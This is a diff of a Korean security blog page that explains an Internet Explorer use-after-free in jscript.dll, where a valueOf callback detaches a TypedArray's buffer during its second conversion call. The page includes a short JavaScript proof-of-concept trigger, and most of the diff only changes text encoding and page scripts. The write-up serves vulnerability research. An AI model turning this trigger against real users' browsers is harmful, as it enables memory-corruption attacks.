@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      272 자
+      437 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      8
        분
     </span>
   
@@ -244,42 +244,42 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Internet Explorer</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer에서 neutering ArrayBuffer로 인한 use after free 취약점이 발견되었습니다. 해당 취약점은 CVE-2020-1380과 비슷한 취약점이지만 JIT 엔진 없이 트리거할 수 있습니다.</p>
-<p>JIT 엔진을 사용하지 않고 item을 TypedArray로 변환할 때 <em>jscript.dll</em>은 interpreter에서 다음과 같은 작업을 수행합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Internet Explorer&#xC5D0;&#xC11C; neutering ArrayBuffer&#xB85C; &#xC778;&#xD55C; use after free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2020-1380&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC9C0;&#xB9CC; JIT &#xC5D4;&#xC9C4; &#xC5C6;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>JIT &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; item&#xC744; TypedArray&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xB54C; <em>jscript.dll</em>&#xC740; interpreter&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li><code>Js::JavascriptConversion::ToNumber()</code> 호출</li>
-<li>TypedArray의 ArrayBuffer가 detach 되었는지 확인</li>
-<li>변환할 element의 index와 TypedArray의 길이 비교</li>
-<li><code>Js::JavascriptConversion::ToNumber()</code>를 다시 호출하여 ArrayBuffer로 값 설정</li>
+<li><code>Js::JavascriptConversion::ToNumber()</code> &#xD638;&#xCD9C;</li>
+<li>TypedArray&#xC758; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;</li>
+<li>&#xBCC0;&#xD658;&#xD560; element&#xC758; index&#xC640; TypedArray&#xC758; &#xAE38;&#xC774; &#xBE44;&#xAD50;</li>
+<li><code>Js::JavascriptConversion::ToNumber()</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD558;&#xC5EC; ArrayBuffer&#xB85C; &#xAC12; &#xC124;&#xC815;</li>
 </ol>
-<p><code>Js::JavascriptConversion::ToNumber()</code>의 첫 번째 호출에서 해커는 callback 함수를 통해 TypedArray의 ArrayBuffer를 free 할 수 있고 uaf를 발생시킬 수 있습니다. 이것을 막기 위해 첫 번째 호출 후 ArrayBuffer가 detach 되었는지 확인하여 user code callback에서 메모리가 free 되는 것을 방지합니다. 하지만 두 번째 호출에서는 별다른 검사를 하지 않기 때문에 이를 악용하여 uaf를 발생시킬 수 있습니다.</p>
+<p><code>Js::JavascriptConversion::ToNumber()</code>&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xB294; callback &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; TypedArray&#xC758; ArrayBuffer&#xB97C; free &#xD560; &#xC218; &#xC788;&#xACE0; uaf&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C; &#xD6C4; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; user code callback&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; free &#xB418;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; uaf&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <details><summary>POC Code</summary>
 <p>
 <pre><code class="hljs js"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float32Array</span>(<span class="hljs-number">0x100</span>);
 <span class="hljs-keyword">var</span> flag = <span class="hljs-number">0</span>;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>&#123;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">index, value</span>) </span>{
     arr[index] = value;
-&#125;
-<span class="hljs-keyword">var</span> obj = &#123;&#125;;
-obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
-    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) &#123;
+}
+<span class="hljs-keyword">var</span> obj = {};
+obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>) {
         worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;&quot;</span>);
-        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;
+        worker.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{};
         worker.postMessage(<span class="hljs-number">0</span>, [arr.buffer]);
         worker.terminate();
         worker = <span class="hljs-literal">null</span>;
         <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();
-        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;
+        <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) {}
         <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;
-    &#125;
+    }
     flag = <span class="hljs-number">1</span>;
-&#125;;
+};
 pwn(<span class="hljs-number">0</span>, obj);</code></pre>
 </p>
 </details>
 
 
-<p>두 번째 인자를 <code>obj</code>로 <code>pwn</code> 함수를 호출하면 item을 TypedArray로 변환할 때 <code>Js::JavascriptConversion::ToNumber()</code>가 호출되어 callback 함수가 두 번 호출됩니다. 첫 번째 호출에는 <code>flag == 0</code>이므로 ArrayBuffer가 neutering 되지 않지만 두 번째 호출에서 ArrayBuffer가 neutering 됩니다. 두 번째 호출에서는 ArrayBuffer가 detach 되었는지 검사하지 않으므로 uaf가 발생합니다.</p>
+<p>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB97C; <code>obj</code>&#xB85C; <code>pwn</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; item&#xC744; TypedArray&#xB85C; &#xBCC0;&#xD658;&#xD560; &#xB54C; <code>Js::JavascriptConversion::ToNumber()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; callback &#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xB294; <code>flag == 0</code>&#xC774;&#xBBC0;&#xB85C; ArrayBuffer&#xAC00; neutering &#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; ArrayBuffer&#xAC00; neutering &#xB429;&#xB2C8;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC5D0;&#xC11C;&#xB294; ArrayBuffer&#xAC00; detach &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; uaf&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -580,6 +580,45 @@ pwn(<span class="hljs-number">0</span>, obj);</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
